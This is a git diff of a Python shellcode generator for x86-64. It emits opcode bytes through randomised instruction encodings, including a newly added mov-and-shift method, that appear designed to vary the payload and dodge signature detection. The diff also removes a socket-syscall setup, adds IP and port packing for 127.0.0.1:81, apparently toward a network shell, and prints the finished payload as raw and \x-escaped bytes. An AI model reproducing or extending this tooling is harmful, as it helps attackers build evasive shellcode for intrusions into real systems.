@@ -37,6 +37,7 @@ def setRegToZero(reg):
 def movValueToReg(reg,value):
     chunk = bytearray()
     case = random.randint(1,2)
+    case = 3
     
     match case:
         case 1: # The push, pop, neg method
@@ -53,7 +54,7 @@ def movValueToReg(reg,value):
 
             chunk += neg
 
-        case 2:
+        case 2: # The push, pop, not method
             chunk.append(0x68)
             value = -value
             value = bytearray(struct.pack("<i",value))
@@ -66,6 +67,33 @@ def movValueToReg(reg,value):
             chunk += not_op
             inc_ope = bytearray([0x48,0xff,(0xC0+registerDictionary[reg])])
             chunk += inc_ope
+        case 3: # the mov and shift method
+            value = bytearray(struct.pack(">q",value))
+            mov_n_shift = bytearray()
+            if reg  in  ("rax" , "rcx" , "rdx" , "rbx"): 
+                for i in value:
+                    mov_n_shift.append(0x48)
+                    mov_n_shift.append(0xC1)
+                    mov_n_shift.append((0xE0+registerDictionary[reg]))
+                    mov_n_shift.append(0x08)
+                    if i != 0:
+                        mov_n_shift.append((0xb0+registerDictionary[reg]))
+                        mov_n_shift.append(i)
+                chunk += mov_n_shift
+            else:
+                for i in value:
+                    mov_n_shift.append(0x48)
+                    mov_n_shift.append(0xC1)
+                    mov_n_shift.append((0xE0+registerDictionary[reg]))
+                    mov_n_shift.append(0x08)
+                    if i != 0:
+                        mov_n_shift.append(0x40)
+                        mov_n_shift.append((0xb0+registerDictionary[reg]))
+                        mov_n_shift.append(i)
+                    
+                chunk += mov_n_shift
+
+
             
 
     
@@ -157,22 +185,40 @@ def pushDWORDToStack(reg):
 
 
 
+ip = "127.0.0.1"
+port = "81"
+
+port = struct.pack("<h", int(port))
+print(port)
+ip = ip.split(".")
+ip = list(map(int,ip))
+ip = bytearray(ip)
+print(bytes(ip))
+
 
 registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}
 # the order works for : push FB, pop FB
 syscall = bytearray([0x0f,0x05])
 shellcode = bytearray()
 
-shellcode += movValueToReg("rdi",2)
-shellcode += movValueToReg("rsi",1)
-shellcode += setRegToZero("rdx")
-shellcode += movValueToReg("rax",41)
-shellcode += syscall
+shellcode += movValueToReg("rdi",0x4789)
+shellcode += movValueToReg("rbx",0x1234567812345678)
 
 
 
 
+print("Shellcode Length: {}".format(len(shellcode)))
+print("RAW hellcode: ",end='\n\n')
+for i in shellcode:
+    if i < 16:
+        print("0{}".format(hex(i).lstrip("0x")),end='')
+    else:
+        print("{}".format(hex(i).lstrip("0x")),end='')
 
+
+
+
+print("\n\nFormatted hellcode: ",end='\n\n')
 for i in shellcode:
     if i < 16:
         print("\\x0{}".format(hex(i).lstrip("0x")),end='')
